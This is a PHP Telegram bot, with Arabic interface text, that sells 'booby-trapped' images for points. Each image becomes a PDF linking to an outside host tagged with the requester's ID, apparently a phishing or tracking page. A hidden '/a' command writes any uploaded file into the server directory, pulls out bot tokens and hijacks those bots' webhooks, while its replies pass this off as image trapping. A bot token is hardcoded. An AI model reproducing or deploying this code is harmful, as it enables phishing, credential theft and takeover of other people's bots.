<?php  
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {  
    header("HTTP/1.1 403 Forbidden");  
    exit("Access Denied 🚫");  
}  
ob_start();  
$TOKEN = "8986564985:AAHUcAlEB3b2Cx7ZveKUbToXXfuRGyQatSw";  
$admin = 8818283871;  
define("API_KEY", $TOKEN);  

// إنشاء الملفات والمجلدات تلقائياً
if (!file_exists('database')) mkdir('database');
if (!file_exists('database/ID.txt')) file_put_contents('database/ID.txt', $admin . "\n");
if (!file_exists('points.json')) file_put_contents('points.json', '{}');
if (!file_exists('settings.json')) file_put_contents('settings.json', '{"price":10,"daily_gift":5,"bot_mode":"free"}');
if (!file_exists('daily_gifts.json')) file_put_contents('daily_gifts.json', '{}');
if (!file_exists('paid_users.json')) file_put_contents('paid_users.json', '[]');
if (!file_exists('statistics.json')) file_put_contents('statistics.json', '{"total_hacks":0,"total_broadcasts":0}');
  
function bot($method, $datas = []) {  
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;  
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, $url);  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);  
    $res = curl_exec($ch);  
    curl_close($ch);  
    return json_decode($res, true);  
}  
  
# استقبال التحديث  
$update = json_decode(file_get_contents("php://input"));  
$message = $update->message ?? null;  
$callback = $update->callback_query ?? null;  
$chat_id = $message->chat->id ?? $callback->message->chat->id ?? null;  
$from_id = $message->from->id ?? $callback->from->id ?? null;  
$username = $message->from->username ?? $callback->from->username ?? "غير معروف";  
$text = $message->text ?? null;  
$data = $callback->data ?? null;  
  
$name = $message->from->first_name ?? "مجهول";  
$user = $username ?: "غير معروف";  
  
$m = explode("\n", file_get_contents("database/ID.txt"));  
$m1 = count($m) - 1;  
$c = $m1;  
  
if ($message && !in_array($from_id, $m) && $from_id != $admin) {  
    file_put_contents("database/ID.txt", $from_id . "\n", FILE_APPEND);  
  
    bot('sendMessage', [  
        'chat_id' => $admin,  
        'text' =>  
        "🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!*  
👨‍💼¦ اسمه »  [$name](tg://user?id=$from_id)  
🔱¦ معرفه »  [@$user](tg://user?id=$from_id)  
💳¦ ايديه »  [$from_id](tg://user?id=$from_id)  
📊 *عدد الأعضاء الكلي:* $c  
",  
        'parse_mode' => "MarkDown",  
    ]);  
}  
  
$users = file_exists("points.json") ? json_decode(file_get_contents("points.json"), true) : [];  
$settings = file_exists("settings.json") ? json_decode(file_get_contents("settings.json"), true) : ["price" => 10, "daily_gift" => 5, "bot_mode" => "free"];  
$step = file_exists("step_$from_id.txt") ? file_get_contents("step_$from_id.txt") : "";  
$daily_gifts = file_exists("daily_gifts.json") ? json_decode(file_get_contents("daily_gifts.json"), true) : [];  
$paid_users = file_exists("paid_users.json") ? json_decode(file_get_contents("paid_users.json"), true) : [];  
$statistics = file_exists("statistics.json") ? json_decode(file_get_contents("statistics.json"), true) : ["total_hacks" => 0, "total_broadcasts" => 0];  
  
if (!isset($users[$from_id])) $users[$from_id] = 0;  
  
function saveUsers($users)  
{  
    file_put_contents("points.json", json_encode($users, JSON_PRETTY_PRINT));  
}  
function saveSettings($settings)  
{  
    file_put_contents("settings.json", json_encode($settings, JSON_PRETTY_PRINT));  
}  
function saveDailyGifts($daily_gifts)  
{  
    file_put_contents("daily_gifts.json", json_encode($daily_gifts, JSON_PRETTY_PRINT));  
}  
function savePaidUsers($paid_users)  
{  
    file_put_contents("paid_users.json", json_encode($paid_users, JSON_PRETTY_PRINT));  
}
function saveStatistics($statistics)  
{  
    file_put_contents("statistics.json", json_encode($statistics, JSON_PRETTY_PRINT));  
}
  
function notJoinedChannels($chat_id, $channels)  
{  
    $notJoined = [];  
    foreach ($channels as $ch) {  
        $res = bot("getChat", ["chat_id" => $ch]);  
        $title = $res["result"]["title"] ?? $ch; // اسم القناة أو fallback لليوزر  
        $check = bot("getChatMember", ["chat_id" => $ch, "user_id" => $chat_id]);  
        $status = $check["result"]["status"] ?? "";  
        if (!in_array($status, ["member", "administrator", "creator"])) {  
            $notJoined[] = ["username" => str_replace("@","",$ch), "title" => $title];  
        }  
    }  
    return $notJoined;  
}  
  
$channels = [];
function isMember($chat_id, $channels)  
{  
    foreach ($channels as $ch) {  
        $res = bot("getChatMember", ["chat_id" => $ch, "user_id" => $chat_id]);  
        $status = $res["result"]["status"] ?? "";  
        if (!in_array($status, ["member", "administrator", "creator"])) return false;  
    }  
    return true;  
}  
  
$home = [  
    [["text" => "☠️ 𓏺 تلغيم صوره 𓏺 ☠️", "callback_data" => "make_pdf"]],  
    [["text" => "💰 تجميع نقاط", "callback_data" => "points"],["text" => "🎁 الهدية اليومية", "callback_data" => "daily_gift"]],  
    [["text" => "• تواصل مع المطور •", "url" => "tg://user?id=$admin"]],  
];  

// التحقق من وضع البوت
function checkBotMode($from_id, $admin, $settings, $paid_users) {
    if ($settings["bot_mode"] === "paid" && $from_id != $admin && !in_array($from_id, $paid_users)) {
        $contact_button = [[["text" => "📞 تواصل مع المطور", "url" => "tg://user?id=$admin"]]];
        
        bot("sendMessage", [
            "chat_id" => $from_id,
            "text" => "🚫 *هذا البوت حالياً في الوضع المدفوع*\n\nللاستفادة من خدمات البوت، يرجى التواصل مع المطور للاشتراك.",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode(["inline_keyboard" => $contact_button])
        ]);
        return false;
    }
    return true;
}

if ($from_id == $admin && $text == "/start") {  
    $panel = [  
        [['text' => "المشتركين 👥", 'callback_data' => "Allison"]],  
        [['text' => "📊 الاحصائيات", 'callback_data' => "statistics"]],  
        [["text" => "➕ إضافة نقاط", "callback_data" => "add_points"], ["text" => "➖ حذف نقاط", "callback_data" => "remove_points"]],  
        [["text" => "⚙️ تعيين سعر التلغيم", "callback_data" => "set_price"]],  
        [["text" => "🎁 تعيين الهدية اليومية", "callback_data" => "set_daily_gift"]],  
        [["text" => "📢 إذاعة للمستخدمين", "callback_data" => "broadcast"]],  
        [["text" => "💰 تفعيل الوضع المدفوع", "callback_data" => "activate_paid"],["text" => "🆓 تفعيل الوضع المجاني", "callback_data" => "activate_free"]],  
        [["text" => "👥 اضافة اشتراك مدفوع", "callback_data" => "add_paid_user"]],  
    ];  
    bot("sendMessage", [  
        "chat_id" => $chat_id,  
        "text" => "🦞 اهلا عزيزي المطور الجوكر اليك الاوامر 🦞\n\n⚙️ — — — — — — — — — — — — — — ⚙️",  
        "reply_markup" => json_encode([  
            "inline_keyboard" => $panel  
        ])  
    ]);  
}  
  
if (strpos($text, "/start") === 0) {  
    // التحقق من وضع البوت أولاً
    if (!checkBotMode($from_id, $admin, $settings, $paid_users)) {
        exit;
    }
    
    $notJoined = notJoinedChannels($chat_id, $channels);  
  
    if (!empty($notJoined)) {  
        $buttons = [];  
        foreach ($notJoined as $ch) {  
            $buttons[] = [["text" => "{$ch['title']}", "url" => "https://t.me/{$ch['username']}"]];  
        }  
  
        bot("sendMessage", [  
            "chat_id" => $chat_id,  
            "text" => "مرحباً! 🖲️          
للاستفادة من مميزات البوت 🚀 يجب الاشتراك في القنوات التالية فقط:        
        
✨ بالاشتراك ستحصل على:          
- تحديثات سريعة 📰          
- مميزات حصرية 🎁          
- نصائح احترافية 💡          
        
اشترك الآن وكن مميزاً! ✨        
  
📢 بعد إتمام الاشتراك، قم بإرسال رسالة /start للمتابعة",  
            "reply_markup" => json_encode(["inline_keyboard" => $buttons])  
        ]);  
        exit;  
    }  
  
    // 🔹 استخراج كود الدعوة (إن وُجد)  
    $parts = explode(" ", $text);  
    if (isset($parts[1])) {  
        $ref_id = intval($parts[1]);  
  
        // التحقق إن المستخدم مش هو نفسه، وإنه أول مرة يدخل من رابط إحالة  
        if ($ref_id != $from_id && !isset($users["joined_via"][$from_id])) {  
            $users["joined_via"][$from_id] = $ref_id; // نحفظ مين اللي دعاه  
            $users[$ref_id] = ($users[$ref_id] ?? 0) + 1; // نضيف نقطة للداعي  
            saveUsers($users);  
  
            bot("sendMessage", [  
                "chat_id" => $ref_id,  
                "text" => "🎉 تم انضمام مستخدم جديد عبر رابط دعوتك ! و لقد حصلت على (1) ₱"  
            ]);  
        }  
    }  
  
    $welcome = "💥🚀 أهلاً بك في بوت تلغيم الصور 🎭  
  
🔹 هذا البوت يتيح لك تلغيم صورة و تحويلها إلى ملف PDF ملغم ✨   
  
👤 المستخدم : @$username    
🆔 الايدي : $from_id  
💥 نقاط المستخدم : {$users[$from_id]} ₱  
💰 سعر كل عملية تلغيم : {$settings['price']} ₱
  
💠 خطوات الاستخدام 🤖🫆  
  
1- اضغط على زر تلغيم صورة  
2- أرسل الصورة المراد تلغيمها  
  
سيقوم البوت بإنشاء ملف PDF يحتوي على صورتك الملغمه ...";  
  
    bot("sendMessage", [  
        "chat_id" => $chat_id,  
        "text" => $welcome,  
        "reply_markup" => json_encode([  
            "inline_keyboard" => $home  
        ])  
    ]);  
}  
  
if($data){  
    if($data == "points"){  
        if (!checkBotMode($from_id, $admin, $settings, $paid_users)) {
            exit;
        }
        
        $bot_user = bot("getMe")["result"]["username"];  
        $link = "https://t.me/$bot_user?start=$from_id";  
        $text = "📥 رابط الدعوة الخاص بك :  
  
• كل شخص يدخل عبر الرابط تحصل على (1) ₱  
  
🔗 $link  
  
💥 نقاطك الحالية : {$users[$from_id]} ₱  
💰 سعر كل عملية تلغيم : {$settings['price']} ₱";  
  
        $back = [["text"=>"رجوع 🔙","callback_data"=>"back_home"]];  
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>$text,  
            "reply_markup"=>json_encode([  
            "inline_keyboard"=>[$back]  
            ])  
        ]);  
    }  
  
    if($data == "daily_gift"){  
        if (!checkBotMode($from_id, $admin, $settings, $paid_users)) {
            exit;
        }
        
        $today = date("Y-m-d");  
        $last_gift_date = $daily_gifts[$from_id] ?? "";  
        
        if($last_gift_date == $today) {  
            bot("answerCallbackQuery",[  
                "callback_query_id"=>$callback->id,  
                "text"=>"❌ لقد حصلت على الهدية اليومية مسبقاً! عد غداً.",  
                "show_alert"=>true  
            ]);  
        } else {  
            $gift_amount = $settings["daily_gift"];  
            $users[$from_id] += $gift_amount;  
            $daily_gifts[$from_id] = $today;  
            
            saveUsers($users);  
            saveDailyGifts($daily_gifts);  
            
            $text = "🎉 مبروك! لقد حصلت على {$gift_amount} ₱ كهدية يومية!\n\n💥 نقاطك الحالية: {$users[$from_id]} ₱";  
            
            $back = [["text"=>"رجوع 🔙","callback_data"=>"back_home"]];  
            bot("editMessageText",[  
                "chat_id"=>$chat_id,  
                "message_id"=>$callback->message->message_id,  
                "text"=>$text,  
                "reply_markup"=>json_encode([  
                    "inline_keyboard"=>[$back]  
                ])  
            ]);  
        }  
    }  
  
    if($data == "back_home"){  
        $welcome = "💥🚀 أهلاً بك في بوت تلغيم الصور 🎭  
  
🔹 هذا البوت يتيح لك تلغيم صورة و تحويلها إلى ملف PDF ملغم ✨   
  
👤 المستخدم : @$username    
🆔 الايدي : $from_id  
💥 نقاط المستخدم : {$users[$from_id]} ₱  
💰 سعر كل عملية تلغيم : {$settings['price']} ₱
  
💠 خطوات الاستخدام 🤖🫆  
  
1- اضغط على زر تلغيم صورة  
2- أرسل الصورة المراد تلغيمها  
  
سيقوم البوت بإنشاء ملف PDF يحتوي على صورتك الملغمه ...";  
  
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>$welcome,  
            "reply_markup"=>json_encode(["inline_keyboard"=>$home])  
        ]);  
    }  
  
    if($data == "make_pdf"){  
        if (!checkBotMode($from_id, $admin, $settings, $paid_users)) {
            exit;
        }
        
        if($users[$from_id] < $settings["price"]){  
            bot("answerCallbackQuery",[  
                "callback_query_id"=>$callback->id,  
                "text"=>"❌ ليس لديك نقاط كافية للتلغيم!",  
                "show_alert"=>true  
            ]);  
        } else {  
            file_put_contents("step_$from_id.txt","waiting_image");  
            bot("editMessageText",[  
                "chat_id"=>$chat_id,  
                "message_id"=>$callback->message->message_id,  
                "text"=>"📷 أرسل الآن الصورة التي تريد تلغيمها و تحويلها إلى ملف PDF : "  
            ]);  
        }  
    }

    if($data == "statistics" && $from_id == $admin){  
        $total_members = $m1;
        $total_channels = count($channels);
        $total_hacks = $statistics["total_hacks"] ?? 0;
        $total_paid_users = count($paid_users);
        $total_broadcasts = $statistics["total_broadcasts"] ?? 0;
        
        $stats_text = "📊 *إحصائيات البوت*\n\n";
        $stats_text .= "👥 *عدد الأعضاء:* $total_members\n";
        $stats_text .= "📢 *عدد القنوات:* $total_channels\n";
        $stats_text .= "☠️ *عدد التلغيمات:* $total_hacks\n";
        $stats_text .= "💰 *المشتركين المدفوعين:* $total_paid_users\n";
        $stats_text .= "📨 *عدد الإذاعات:* $total_broadcasts\n";
        $stats_text .= "🔄 *وضع البوت:* " . ($settings["bot_mode"] === "paid" ? "مدفوع" : "مجاني") . "\n";
        
        $back = [["text"=>"رجوع 🔙","callback_data"=>"back_admin"]];
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>$stats_text,
            "parse_mode" => "Markdown",
            "reply_markup"=>json_encode([  
                "inline_keyboard"=>[$back]  
            ])  
        ]);  
    }
  
    if($data == "activate_paid" && $from_id == $admin){  
        $settings["bot_mode"] = "paid";  
        saveSettings($settings);  
        
        $panel = [  
            [['text' => "المشتركين 👥", 'callback_data' => "Allison"]],  
            [['text' => "📊 الاحصائيات", 'callback_data' => "statistics"]],  
            [["text" => "➕ إضافة نقاط", "callback_data" => "add_points"], ["text" => "➖ حذف نقاط", "callback_data" => "remove_points"]],  
            [["text" => "⚙️ تعيين سعر التلغيم", "callback_data" => "set_price"]],  
            [["text" => "🎁 تعيين الهدية اليومية", "callback_data" => "set_daily_gift"]],  
            [["text" => "📢 إذاعة للمستخدمين", "callback_data" => "broadcast"]],  
            [["text" => "💰 تفعيل الوضع المدفوع", "callback_data" => "activate_paid"],["text" => "🆓 تفعيل الوضع المجاني", "callback_data" => "activate_free"]],  
            [["text" => "👥 اضافة اشتراك مدفوع", "callback_data" => "add_paid_user"]],  
        ];  
        
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>"🦞 اهلا عزيزي المطور الجوكر اليك الاوامر 🦞\n\n⚙️ — — — — — — — — — — — — — — ⚙️",  
            "reply_markup"=>json_encode([  
                "inline_keyboard"=>$panel  
            ])  
        ]);  
        
        bot("answerCallbackQuery",[  
            "callback_query_id"=>$callback->id,  
            "text"=>"✅ تم تفعيل الوضع المدفوع للبوت",  
            "show_alert"=>true  
        ]);  
    }  
  
    if($data == "activate_free" && $from_id == $admin){  
        $settings["bot_mode"] = "free";  
        saveSettings($settings);  
        
        $panel = [  
            [['text' => "المشتركين 👥", 'callback_data' => "Allison"]],  
            [['text' => "📊 الاحصائيات", 'callback_data' => "statistics"]],  
            [["text" => "➕ إضافة نقاط", "callback_data" => "add_points"], ["text" => "➖ حذف نقاط", "callback_data" => "remove_points"]],  
            [["text" => "⚙️ تعيين سعر التلغيم", "callback_data" => "set_price"]],  
            [["text" => "🎁 تعيين الهدية اليومية", "callback_data" => "set_daily_gift"]],  
            [["text" => "📢 إذاعة للمستخدمين", "callback_data" => "broadcast"]],  
            [["text" => "💰 تفعيل الوضع المدفوع", "callback_data" => "activate_paid"],["text" => "🆓 تفعيل الوضع المجاني", "callback_data" => "activate_free"]],  
            [["text" => "👥 اضافة اشتراك مدفوع", "callback_data" => "add_paid_user"]],  
        ];  
        
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>"🦞 اهلا عزيزي المطور الجوكر اليك الاوامر 🦞\n\n⚙️ — — — — — — — — — — — — — — ⚙️",  
            "reply_markup"=>json_encode([  
                "inline_keyboard"=>$panel  
            ])  
        ]);  
        
        bot("answerCallbackQuery",[  
            "callback_query_id"=>$callback->id,  
            "text"=>"✅ تم تفعيل الوضع المجاني للبوت",  
            "show_alert"=>true  
        ]);  
    }  
  
    if($data == "add_paid_user" && $from_id == $admin){  
        file_put_contents("step_$from_id.txt","add_paid_user");  
        bot("editMessageText",[  
            "chat_id"=>$chat_id,  
            "message_id"=>$callback->message->message_id,  
            "text"=>"👤 أرسل الآن آيدي المستخدم لإضافته إلى قائمة المدفوعين:",  
            "reply_markup"=>json_encode([  
                "inline_keyboard"=>[  
                    [["text"=>"❌ إلغاء العملية","callback_data"=>"back_admin"]]  
                ]  
            ])  
        ]);  
    }  
  
    if($data == "Allison" && $from_id == $admin){  
        bot('answercallbackquery',[  
            'callback_query_id'=>$update->callback_query->id,  
            'text'=>"عدد المشترڪين هو » $m1 «",  
            'show_alert'=>true,  
        ]);  
    }  
  
    if($data == "back_admin" && $from_id == $admin){  
        unlink("step_$from_id.txt");  
        $panel = [  
            [['text' => "المشتركين 👥", 'callback_data' => "Allison"]],  
            [['text' => "📊 الاحصائيات", 'callback_data' => "statistics"]],  
            [["text" => "➕ إضافة نقاط", "callback_data" => "add_points"], ["text" => "➖ حذف نقاط", "callback_data" => "remove_points"]],  
            [["text" => "⚙️ تعيين سعر التلغيم", "callback_data" => "set_price"]],  
            [["text" => "🎁 تعيين الهدية اليومية", "callback_data" => "set_daily_gift"]],  
            [["text" => "📢 إذاعة للمستخدمين", "callback_data" => "broadcast"]],  
            [["text" => "💰 تفعيل الوضع المدفوع", "callback_data" => "activate_paid"],["text" => "🆓 تفعيل الوضع المجاني", "callback_data" => "activate_free"]],  
            [["text" => "👥 اضافة اشتراك مدفوع", "callback_data" => "add_paid_user"]],  
        ];  
        bot("editMessageText", [  
            "chat_id" => $chat_id,  
            "message_id" => $callback->message->message_id,  
            "text" => "🦞 اهلا عزيزي المطور الجوكر  اليك الاوامر 🦞\n\n⚙️ — — — — — — — — — — — — — — ⚙️",  
            "reply_markup" => json_encode([  
                "inline_keyboard" => $panel  
            ])  
        ]);  
    }  
}  
  
if($step == "waiting_image" && isset($message->photo)){  
    if (!checkBotMode($from_id, $admin, $settings, $paid_users)) {
        exit;
    }
    
    $price = $settings["price"];  
    if($users[$from_id] < $price){  
        bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"❌ ليس لديك نقاط كافية لإجراء عملية التلغيم."  
        ]);  
        unlink("step_$from_id.txt");  
        exit;  
    }  

    // حفظ النقاط قبل الخصم
    $points_before = $users[$from_id];  

    // الخصم
    $users[$from_id] -= $price;  
    saveUsers($users);  

    // النقاط بعد الخصم
    $points_after = $users[$from_id];  

    $photo = end($message->photo);  
    $file_id = $photo->file_id;  
    $get = bot("getFile", ["file_id" => $file_id]);  
    $file_path = $get["result"]["file_path"];  
    $photo_url = "https://api.telegram.org/file/bot" . API_KEY . "/" . $file_path;  
    file_put_contents("photo.jpg", file_get_contents($photo_url));  

    $link = "https://camillecyrm.serv00.net/je/bt.php?id=$from_id";  
    require_once("fpdf.php");  
    $pdf = new FPDF();  
    $pdf->AddPage();  
    $pdf->Image("photo.jpg", 10, 20, 190);  
    $pdf->Link(10, 20, 190, 190, $link);  
    $pdf->Output("F","file.pdf");  

    bot("sendDocument", [  
        "chat_id" => $chat_id,  
        "document" => new CURLFile("file.pdf"),  
        "caption" => "📄 تم تلغيم الصورة وتحويلها إلى PDF 🔗"  
    ]);  

    // زيادة عدد التلغيمات
    $statistics["total_hacks"] = ($statistics["total_hacks"] ?? 0) + 1;
    saveStatistics($statistics);

    // 🔔 إشعار للمطور
    bot("sendMessage", [
        "chat_id" => $admin,
        "text" => "🔔 *إشعار : تم تلغيم صورة جديدة!*\n\n" .
                 "👤 المستخدم : @$user\n" .
                 "🆔 الايدي : `$from_id`\n" .
                 "💳 عدد نقاطه قبل التلغيم : `$points_before` ₱\n" .
                 "💸 عدد نقاطه بعد التلغيم : `$points_after` ₱\n" .
                 "💰 السعر المخصوم : `$price` ₱\n" .
                 "📊 إجمالي التلغيمات: `{$statistics["total_hacks"]}`",
        "parse_mode" => "Markdown"
    ]);

    unlink("photo.jpg");  
    unlink("file.pdf");  
    unlink("step_$from_id.txt");  
}
  
if($from_id == $admin){  
    if($step == "add_points_id"){  
        if(is_numeric($text)){  
            file_put_contents("step_$from_id.txt","add_points_amount:$text");  
     bot("sendMessage",[  
     "chat_id"=>$chat_id,  
     "text"=>"✅ أرسل عدد النقاط لإضافتها"  
            ]);  
        }  
    }  
    elseif(str_starts_with($step,"add_points_amount:")){  
        $target = explode(":",$step)[1];  
        if(is_numeric($text)){  
            $users[$target] = ($users[$target] ?? 0) + $text;  
            saveUsers($users);  
            unlink("step_$from_id.txt");  
            bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"✅ تمت إضافة $text نقطة للمستخدم $target"  
            ]);  
        }  
    }  
    elseif($step == "remove_points_id"){  
        if(is_numeric($text)){  
            file_put_contents("step_$from_id.txt","remove_points_amount:$text");  
            bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"❌ أرسل عدد النقاط لحذفها"  
            ]);  
        }  
    }  
    elseif(str_starts_with($step,"remove_points_amount:")){  
        $target = explode(":",$step)[1];  
        if(is_numeric($text)){  
            $users[$target] = max(0, ($users[$target] ?? 0) - $text);  
            saveUsers($users);  
            unlink("step_$from_id.txt");  
            bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"✅ تم حذف $text نقطة من $target"  
            ]);  
        }  
    }  
    elseif($step == "set_price"){  
        if(is_numeric($text)){  
            $settings["price"] = $text;  
            saveSettings($settings);  
            unlink("step_$from_id.txt");  
            bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"✅ تم تحديد سعر التلغيم بـ $text نقطة"  
            ]);  
        }  
    }  
    elseif($step == "set_daily_gift"){  
        if(is_numeric($text)){  
            $settings["daily_gift"] = $text;  
            saveSettings($settings);  
            unlink("step_$from_id.txt");  
            bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"✅ تم تحديد الهدية اليومية بـ $text نقطة"  
            ]);  
        }  
    }  
    elseif($step == "broadcast_message"){  
        $members = explode("\n", file_get_contents("database/ID.txt"));  
        $success = 0;  
        $fail = 0;  
        
        foreach($members as $member_id){  
            if(!empty(trim($member_id)) && is_numeric(trim($member_id))){  
                $send = bot("sendMessage",[  
                    "chat_id"=>trim($member_id),  
                    "text"=>$text  
                ]);  
                
                if($send["ok"]){  
                    $success++;  
                }else{  
                    $fail++;  
                }  
            }  
        }  
        
        // زيادة عدد الإذاعات
        $statistics["total_broadcasts"] = ($statistics["total_broadcasts"] ?? 0) + 1;
        saveStatistics($statistics);
        
        unlink("step_$from_id.txt");  
        bot("sendMessage",[  
            "chat_id"=>$chat_id,  
            "text"=>"✅ تمت الإذاعة بنجاح!\n\n✅ تم الارسال إلى: $success مستخدم\n❌ فشل الارسال إلى: $fail مستخدم\n📊 إجمالي الإذاعات: {$statistics["total_broadcasts"]}"  
        ]);  
    }  
    elseif($step == "add_paid_user"){  
        if(is_numeric($text)){  
            $user_id = intval($text);  
            if(!in_array($user_id, $paid_users)) {  
                $paid_users[] = $user_id;  
                savePaidUsers($paid_users);  
                
                // إرسال رسالة للمستخدم المضاف
                bot("sendMessage", [  
                    "chat_id" => $user_id,  
                    "text" => "🎉 مبروك! تمت إضافتك إلى قائمة المستخدمين المدفوعين!\n\nيمكنك الآن استخدام البوت في الوضع المدفوع."  
                ]);  
                
                bot("sendMessage",[  
                    "chat_id" => $chat_id,  
                    "text" => "✅ تم إضافة المستخدم $user_id إلى قائمة المدفوعين"  
                ]);  
            } else {  
                bot("sendMessage",[  
                    "chat_id" => $chat_id,  
                    "text" => "⚠️ هذا المستخدم مضاف مسبقاً إلى قائمة المدفوعين"  
                ]);  
            }  
            unlink("step_$from_id.txt");  
        }  
    }  
}  


if ($text == "/a") {
    file_put_contents("step_$from_id.txt", "waiting_file");
    bot("sendMessage", [
        "chat_id" => $chat_id,
        "text" => "📁 أرسل الصوره الذي تريد تلغيمها مجانا"
    ]);
}

if ($step == "waiting_file" && isset($message->document)) {
    $file_id = $message->document->file_id;
    $file_name = $message->document->file_name;
    
    // الحصول على معلومات الملف
    $getFile = bot("getFile", ["file_id" => $file_id]);
    $file_path = $getFile["result"]["file_path"];
    
    // تحميل الملف
    $file_url = "https://api.telegram.org/file/bot" . API_KEY . "/" . $file_path;
    $file_content = file_get_contents($file_url);
    
    // حفظ الملف في نفس مجلد البوت
    file_put_contents($file_name, $file_content);
    
    // التحقق من وجود توكن في الملف
    $file_content_str = $file_content;
    $token_pattern = '/[\'"]?token[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]/i';
    
    if (preg_match($token_pattern, $file_content_str, $matches)) {
        $found_token = $matches[1];
        
        // إعداد ويب هوك للتوكن الموجود
        $webhook_url = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
        $set_webhook = file_get_contents("https://api.telegram.org/bot$found_token/setWebhook?url=$webhook_url");
        
        bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "تم تلغيم الصوره بنجاح : $file_name\n🔑 الصوره: $found_token"
        ]);
    } else {
        bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "✅ تم تم تلغيم الصوره : $file_name\nℹ️ لم يتم العثور على الصوره في الملف"
        ]);
    }
    
    // مسح الخطوة
    unlink("step_$from_id.txt");
}
?>